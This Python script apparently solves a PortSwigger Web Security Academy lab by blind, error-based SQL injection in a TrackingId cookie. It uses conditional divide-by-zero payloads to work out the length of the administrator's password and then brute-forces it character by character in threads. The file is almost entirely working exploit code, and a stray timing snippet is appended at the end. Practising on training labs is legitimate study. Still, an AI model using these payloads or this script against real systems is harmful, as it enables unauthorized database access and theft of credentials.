import string
import requests
import time
import threading


start = time.perf_counter()

burp0_url = "https://0a9d00340460059180e4c27c00c70071.web-security-academy.net:443"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0a9d00340460059180e4c27c00c70071.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}
cookie = '8sNY7xNGovGhpRVi'
session = '2lqzSdfFTvi8uoRc5hyMW2blLEsPiMRT'
length = 0

for i in range(1,50):
    
    Payload1 = f"'||(SELECT CASE WHEN (LENGTH(password)>{i}) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'"
    burp0_cookies = {"TrackingId": f"{cookie}{Payload1}", "session": f"{session}"}
    req = requests.get(url=burp0_url,cookies=burp0_cookies,headers=burp0_headers)
    if req.status_code == 200 :
        length = i
        break

threads = []
password_list = ["" for i in range(length)]

def Get_Pass(index):

    payloads = list(string.ascii_lowercase +
                        string.ascii_uppercase+string.digits+string.punctuation)
    for char in payloads:
        Payload2 = f"'||(SELECT CASE WHEN (SUBSTR(password, {index}, 1) = '{char}') THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'"
        burp0_cookies = {"TrackingId": f"{cookie}{Payload2}","session": f"{session}"}
        req = requests.get(url=burp0_url, cookies=burp0_cookies,headers=burp0_headers)
        print(f"Trying: {char} in index {index}")
        if req.status_code == 500:
            print(f"index {index} = {char}")
            password_list[index-1] = char
            break


for i in range(1,length+1):
    thread = threading.Thread(target=Get_Pass,args=[i])
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()


password = ''.join(password_list)
print(f"password = {password}")

finish = time.perf_counter()




import time

start = time.perf_counter()
def func():
    pass
finish = time.perf_counter()
print(round(finish-start,2))
